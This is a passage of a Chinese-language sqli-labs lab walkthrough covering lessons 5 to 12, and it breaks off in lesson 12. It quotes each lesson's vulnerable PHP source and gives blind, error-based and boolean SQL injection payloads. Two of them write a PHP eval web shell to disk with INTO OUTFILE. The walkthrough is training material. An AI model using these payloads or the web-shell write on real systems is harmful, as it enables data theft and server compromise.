+<p>?id=1&rsquo;UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(&lsquo;MSG&rsquo;,&lsquo;by 5 seconds&rsquo;)),null)),2,3 FROM (select database() as current) as tb1&ndash;+</p>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><code>sleep()</code></p>
+<p>爆库名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select schema_name from information_schema.schemata limit 2,1), 1, 1))=115),sleep(5),0)-- -
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0,1), 1, 1))=101),sleep(5),0)-- -
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select column_name from information_schema.columns where table_name=&#34;users&#34; limit 0,1), 1, 1))=105),sleep(5),0)-- -
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select username from users limit 0,1), 1, 1))=68),sleep(5),0)-- -
+</span></span></code></pre></div></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p><code>benchmark()</code></p>
+<p>爆库名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select schema_name from information_schema.schemata limit 2,1), 1, 1))=115),benchmark(5000000000000000, sha(1),0)-- -
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0,1), 1, 1))=101),benchmark(5000000000000000, sha(1),0)-- -
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select column_name from information_schema.columns where table_name=&#34;users&#34; limit 0,1), 1, 1))=105),benchmark(5000000000000000, sha(1),0)-- -
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39; and if((ascii(substr((select username from users limit 0,1), 1, 1))=68),benchmark(5000000000000000, sha(1),0)-- -
+</span></span></code></pre></div></li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>笛卡尔积(heavy query)</p>
+<p>爆库名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select schema_name from information_schema.schemata limit 0, 1),1,1)) &lt; 80 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -
+</span></span></code></pre></div><p>爆表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select table_name from information_schema.tables where table_schema=&#34;security&#34; limit 0, 1),1,1)) &lt; 80 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -
+</span></span></code></pre></div><p>爆列名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select column_name from information_schema.columns where table_name=&#34;users&#34; limit 0, 1),1,1)) &gt; 80 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -
+</span></span></code></pre></div><p>爆数据</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/sqli/Less-5/
+</span></span><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select username from users limit 0, 1),1,1)) &lt; 50 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)-- -
+</span></span></code></pre></div></li>
+</ul>
+</li>
+</ul>
+<h4 id="lesson-6">lesson 6</h4>
+<p>看源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=</span><span class="si">$id</span><span class="s2"> LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span></code></pre></div><p>与lesson 5的区别就在于这里用双引号包裹了id，所以要用&quot;逃逸</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s2">&#34; and updatexml(1,concat(0x7e,database(),0x7e,version(),0x7e),3)-- -
+</span></span></span></code></pre></div><h4 id="lesson-7">lesson 7</h4>
+<p>看源码,发现是 <code>'))</code> 闭合</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=((&#39;</span><span class="si">$id</span><span class="s2">&#39;)) LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
+</span></span></code></pre></div><p>根据题目提示 &ldquo;Use outfile&rdquo;,我们通过写入一句话木马来实现</p>
+<p>这里有两种思路，一种是把查询的数据通过 <code>into outfile</code> 存放到文件当中，然后直接访问得到查询结果</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;)) union select 1,2,3 into outfile &#34;[absolute path]/test.txt&#34;
+</span></span></span></code></pre></div><p>另一种是通过写入一句话木马，然后利用菜刀或者蚁剑进行连接</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;)) union select 1,2,&#39;</span><span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="o">@</span><span class="n">eval</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s2">&#34;mima&#34;</span><span class="p">])</span><span class="o">?&gt;</span><span class="s1">&#39; into outfile &#34;[absolute path]/test.php&#34; -- -
+</span></span></span></code></pre></div><h4 id="lesson-8">lesson 8</h4>
+<p>看源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font size=&#34;5&#34; color=&#34;#FFFF00&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;You are in...........&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font size=&#34;5&#34; color=&#34;#FFFF00&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//echo &#39;You are in...........&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//print_r(mysqli_error($con1));
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//echo &#34;You have an error in your SQL syntax&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size= 3&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>用单引号闭合 <code>'</code> ，但是报错被注视掉了因此考虑使用盲注</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; or if(ascii(substr(database(),1,1))&gt;115,sleep(5), 0)-- -
+</span></span></span></code></pre></div><h4 id="lesson-9">lesson 9</h4>
+<p>看源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=&#39;</span><span class="si">$id</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font size=&#34;5&#34; color=&#34;#FFFF00&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;You are in...........&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font size=&#34;5&#34; color=&#34;#FFFF00&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;You are in...........&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//print_r(mysqli_error($con1));
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//echo &#34;You have an error in your SQL syntax&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size= 3&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>发现与less-8基本一致，因此同样适用延时盲注</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; or if(ascii(substr(database(),1,1))&gt;115,sleep(5), 0)-- -
+</span></span></span></code></pre></div><h4 id="lesson-10">lesson 10</h4>
+<p>看源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$id</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE id=</span><span class="si">$id</span><span class="s2"> LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font size=&#34;5&#34; color=&#34;#FFFF00&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;You are in...........&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font size=&#34;5&#34; color=&#34;#FFFF00&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;You are in...........&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//print_r(mysqli_error($con1));
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//echo &#34;You have an error in your SQL syntax&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size= 3&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>这里发现对于id进行处理，使用了双引号=&quot;&quot;= 进行包裹，因此修改一下injection payload就可以了，同样也是延时注入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; or if(ascii(substr(database(),1,1))&gt;115,sleep(5), 0)-- -
+</span></span></span></code></pre></div><h4 id="lesson-11">lesson 11</h4>
+<p>观察源码</p>
+<ol>
+<li>
+<p>不同于前几题，这里获取的是POST的值</p>
+</li>
+<li>
+<p>uname &amp; passwd 的地位一致，都没有进行额外的处理</p>
+</li>
+</ol>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$uname</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$passwd</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//logging the connection parameters to a file for analysis.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$fp</span><span class="o">=</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;result.txt&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s1">&#39;User Name:&#39;</span><span class="o">.</span><span class="nv">$uname</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="s1">&#39;Password:&#39;</span><span class="o">.</span><span class="nv">$passwd</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// connectivity
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=&#39;</span><span class="si">$uname</span><span class="s2">&#39; and password=&#39;</span><span class="si">$passwd</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//echo &#39;&lt;font color= &#34;#0000ff&#34;&gt;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#FFFF00&#34; font size = 4&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//echo &#34; You Have successfully logged in\n\n &#34; ;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">echo</span> <span class="s1">&#39;&lt;font size=&#34;3&#34; color=&#34;#0000ff&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;Your Login name:&#39;</span><span class="o">.</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;Your Password:&#39;</span> <span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;img src=&#34;../images/flag.jpg&#34;  /&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size=&#34;3&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//echo &#34;Try again looser&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$con1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;img src=&#34;../images/slap.jpg&#34; /&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>同时使用 <code>1'</code> 查看报错
+可知需要escape 一个单引号</p>
+<figure><img src="/ox-hugo/2022-04-21_21-42-08_screenshot.png" width="700px"/>
+</figure>
+
+<ol>
+<li>文件写入</li>
+</ol>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="w"> </span><span class="o">=</span><span class="w">  </span><span class="mi">1</span><span class="s1">&#39; union select 1,&#39;</span><span class="o">&lt;?</span><span class="n">php</span><span class="w"> </span><span class="o">@</span><span class="n">eval</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s2">&#34;mima&#34;</span><span class="p">])</span><span class="o">?&gt;</span><span class="s1">&#39; into outfile &#34;[Absoute path]/test.php&#34;-- -
+</span></span></span></code></pre></div><ol>
+<li>报错注入</li>
+</ol>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3)-- -
+</span></span></span></code></pre></div><ol>
+<li>延时注入</li>
+</ol>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; or if(substr(database(),1,1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39;, sleep(5), 1)-- -
+</span></span></span></code></pre></div><ol>
+<li>布尔注入</li>
+</ol>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">uname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="s1">&#39; or left(database(),1)&gt;&#39;</span><span class="n">a</span><span class="s1">&#39;-- -
+</span></span></span></code></pre></div><h4 id="lesson-12">lesson 12</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// connectivity
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$uname</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$uname</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$passwd</span><span class="o">=</span><span class="s1">&#39;&#34;&#39;</span><span class="o">.</span><span class="nv">$passwd</span><span class="o">.</span><span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">@</span><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT username, password FROM users WHERE username=(</span><span class="si">$uname</span><span class="s2">) and password=(</span><span class="si">$passwd</span><span class="s2">) LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
+</span></span></code></pre></div><p>也可以手工测试
+此时 <code>1'</code> 没有起到闭合的作用，因此什么都没有发生
+尝试 <code>1&quot;</code> ,报错，此时闭合了一个双引号，还需要escape括号</p>
+<figure><img src="/ox-hugo/2022-04-21_21-43-06_screenshot.png" width="700px"/>
+</figure>
+
+<p>双引号 <code>(&quot;&quot;)</code> 包裹，其他与lesson11一致，不再赘述</p>
+<ol>
+<li>报错注入</li>
+</ol>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="mi">1</span><span class="s2">&#34;)and extractvalue(1, concat(0x7e, database(), 0x7e))-- -
